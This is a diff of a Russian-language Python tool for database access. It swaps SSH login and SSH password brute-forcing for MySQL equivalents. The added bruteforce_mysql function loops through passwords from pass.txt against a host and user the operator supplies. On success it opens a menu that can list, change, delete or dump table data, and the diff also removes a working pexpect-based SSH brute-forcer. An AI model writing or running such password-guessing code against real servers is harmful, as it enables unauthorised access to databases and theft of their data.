@@ -1,8 +1,8 @@
 import subprocess
 import sys
 import os
-import pexpect
 import psycopg2
+import mysql.connector
 
 def manual_input_psql():
     host = input("Введите доменное имя или IP-адрес: ")
@@ -23,6 +23,28 @@ def manual_input_psql():
         )
         print("Успешное подключение к базе данных PostgreSQL")
         psql_menu(conn)
+    except Exception as e:
+        print(f"Ошибка при подключении к базе данных: {e}")
+
+def manual_input_mysql():
+    host = input("Введите доменное имя или IP-адрес: ")
+    port = input("Введите порт (оставьте пустым для порта по умолчанию 3306): ")
+    if not port:
+        port = "3306"
+    username = input("Введите имя пользователя: ")
+    database = input("Введите имя базы данных: ")
+    password = input("Введите пароль: ")
+    
+    try:
+        conn = mysql.connector.connect(
+            host=host,
+            port=port,
+            user=username,
+            password=password,
+            database=database
+        )
+        print("Успешное подключение к базе данных MySQL")
+        mysql_menu(conn)
     except Exception as e:
         print(f"Ошибка при подключении к базе данных: {e}")
 
@@ -53,13 +75,47 @@ def psql_menu(conn):
         else:
             print("Неверный выбор. Пожалуйста, выберите действие от 1 до 6.")
 
+def mysql_menu(conn):
+    while True:
+        print("\nВыберите действие:")
+        print("1. Показать таблицы")
+        print("2. Выбрать данные из таблицы")
+        print("3. Добавить данные в таблицу")
+        print("4. Удалить данные из таблицы")
+        print("5. Скачать данные в текстовый файл")
+        print("6. Выход")
+        choice = input("Введите номер действия: ")
+        
+        if choice == "1":
+            show_tables(conn)
+        elif choice == "2":
+            select_data(conn)
+        elif choice == "3":
+            insert_data(conn)
+        elif choice == "4":
+            delete_data(conn)
+        elif choice == "5":
+            download_data(conn)
+        elif choice == "6":
+            print("Выход из меню MySQL")
+            break
+        else:
+            print("Неверный выбор. Пожалуйста, выберите действие от 1 до 6.")
+
 def show_tables(conn):
     cursor = conn.cursor()
-    cursor.execute("""
-        SELECT table_name 
-        FROM information_schema.tables 
-        WHERE table_schema = 'public'
-    """)
+    if isinstance(conn, psycopg2.extensions.connection):
+        cursor.execute("""
+            SELECT table_name 
+            FROM information_schema.tables 
+            WHERE table_schema = 'public'
+        """)
+    elif isinstance(conn, mysql.connector.connection.MySQLConnection):
+        cursor.execute("""
+            SELECT table_name 
+            FROM information_schema.tables 
+            WHERE table_schema = DATABASE()
+        """)
     tables = cursor.fetchall()
     print("\nТаблицы в базе данных:")
     for table in tables:
@@ -158,22 +214,13 @@ def bruteforce_psql():
         except Exception as e:
             print(f"Неверный пароль или другая ошибка: {e}")
 
-def manual_input_ssh():
+def bruteforce_mysql():
     host = input("Введите доменное имя или IP-адрес: ")
-    port = input("Введите порт (оставьте пустым для порта по умолчанию 22): ")
+    port = input("Введите порт (оставьте пустым для порта по умолчанию 3306): ")
     if not port:
-        port = "22"
+        port = "3306"
     username = input("Введите имя пользователя: ")
-    password = input("Введите пароль: ")
-    
-    ssh_connect(host, int(port), username, password)
-
-def bruteforce_ssh():
-    host = input("Введите доменное имя или IP-адрес: ")
-    port = input("Введите порт (оставьте пустым для порта по умолчанию 22): ")
-    if not port:
-        port = "22"
-    username = input("Введите имя пользователя: ")
+    database = input("Введите имя базы данных: ")
     
     with open("pass.txt", "r") as file:
         passwords = file.readlines()
@@ -183,43 +230,22 @@ def bruteforce_ssh():
         print(f"Пробуем пароль: {password}")
         
         try:
-            ssh_connect(host, int(port), username, password)
+            conn = mysql.connector.connect(
+                host=host,
+                port=port,
+                user=username,
+                password=password,
+                database=database
+            )
             print(f"Успешный вход! Пароль: {password}")
+            mysql_menu(conn)
             return  # Останавливаем брутфорс, если пароль верный
-        except pexpect.exceptions.EOF:
-            print("Неверный пароль, пробуем следующий...")
-        except pexpect.exceptions.TIMEOUT:
-            print("Время ожидания истекло, пробуем следующий пароль...")
         except Exception as e:
-            print(f"Ошибка при выполнении команды: {e}")
-            break
-
-def ssh_connect(hostname, port, username, password):
-    ssh_command = f"ssh -p {port} {username}@{hostname}"
-    child = pexpect.spawn(ssh_command)
-    
-    try:
-        i = child.expect(['password:', pexpect.EOF, pexpect.TIMEOUT])
-        if i == 0:
-            child.sendline(password)
-            i = child.expect(['$', '#', pexpect.EOF, pexpect.TIMEOUT])
-            if i == 0 or i == 1:
-                print("Успешное подключение по SSH")
-                child.interact()
-            else:
-                raise pexpect.exceptions.EOF
-        else:
-            raise pexpect.exceptions.EOF
-    except pexpect.exceptions.EOF:
-        raise pexpect.exceptions.EOF
-    except pexpect.exceptions.TIMEOUT:
-        raise pexpect.exceptions.TIMEOUT
-    finally:
-        child.close()
+            print(f"Неверный пароль или другая ошибка: {e}")
 
 def main_menu():
     print("1. Подключение к PostgreSQL (psql)")
-    print("2. Подключение к SSH")
+    print("2. Подключение к MySQL")
     choice = input("Выберите опцию (1 или 2): ")
     
     if choice == "1":
@@ -238,9 +264,9 @@ def main_menu():
         print("2. Брутфорс пароля")
         sub_choice = input("Выберите опцию (1 или 2): ")
         if sub_choice == "1":
-            manual_input_ssh()
+            manual_input_mysql()
         elif sub_choice == "2":
-            bruteforce_ssh()
+            bruteforce_mysql()
         else:
             print("Неверный выбор. Пожалуйста, выберите 1 или 2.")
             main_menu()
@@ -250,10 +276,10 @@ def main_menu():
 
 if __name__ == "__main__":
     try:
-        import pexpect
         import psycopg2
+        import mysql.connector
     except ImportError:
-        print("Ошибка: модули pexpect или psycopg2 не установлены. Пожалуйста, установите их с помощью 'pip install pexpect psycopg2'.")
+        print("Ошибка: модули psycopg2 или mysql-connector-python не установлены. Пожалуйста, установите их с помощью 'pip install psycopg2 mysql-connector-python'.")
         sys.exit(1)
     
     main_menu()
